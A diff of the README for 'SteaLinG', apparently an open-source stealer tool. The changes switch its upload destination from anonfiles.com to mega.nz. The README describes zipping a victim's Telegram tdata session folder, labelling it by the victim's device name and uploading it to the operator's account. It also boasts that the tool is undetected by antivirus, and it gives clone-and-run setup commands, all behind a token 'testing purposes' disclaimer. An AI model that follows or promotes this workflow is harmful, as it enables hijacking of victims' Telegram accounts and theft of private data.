@@ -2,7 +2,7 @@
 <h1 align="center">
   <br>
   <br>
-  SteaLinG v0.3
+  SteaLinG v3.1
   <br>  
 </h1>
 
@@ -24,7 +24,7 @@ This is only for testing purposes and can only be used where strict consent has 
 * for developers <br>
 you can read the source code and try to understand how to make a project like this
 ### Features
-
+Due to the closure of **anonfiles.com** I have modified the code, and it now uploads the results to **mega.nz**
 
 _______________________________________________________________________________________________
 | module         | Short description                                           |
@@ -56,7 +56,7 @@ C:
 
 ```
 
-Once you have moved this folder, along with all its contents, to your device in the same path, you will simply need to perform the required action. The tool will take care of everything, and all you need to do is provide your token on the `https://anonfiles.com/` website. The first step is to navigate to the location of the tdata file, and then convert it to a zip file. If Telegram is functioning correctly, then this error will not occur. If an error does occur, it means that Telegram is open, and you should terminate its processes. You will notice that this behavior is malicious, so I have completely avoided it by using try and except in the code. The name of the archive file is used in the name of the victim's device, because if you have multiple devices, it is possible to differentiate between them. After that, you will submit a request for the zipfile on the anonfiles website using the API key or the token of your account on the site. Your token can be found there. That's all, teacher, and it is not detected by any antivirus software.
+Once you have moved this folder, along with all its contents, to your device in the same path, you will simply need to perform the required action. The tool will take care of everything, and all you need to do is provide your Email and Password on the `https://mega.nz/` website. The first step is to navigate to the location of the tdata file, and then convert it to a zip file. If Telegram is functioning correctly, then this error will not occur. If an error does occur, it means that Telegram is open, and you should terminate its processes. You will notice that this behavior is malicious, so I have completely avoided it by using try and except in the code. The name of the archive file is used in the name of the victim's device, because if you have multiple devices, it is possible to differentiate between them. After that, you will submit a request for the zipfile on the `mega` website using the Email and Password  That's all, It is undetected by any AV.
 
 | module         |
 | :------------- | 
@@ -97,6 +97,7 @@ git clone https://github.com/De3vil/SteaLinG.git
 cd SteaLinG
 chmod +x linux_setup.sh
 bash linux_setup.sh
+python3 -m pip install -r requirements.txt
 python SteaLinG.py
 ```
 ### warning:
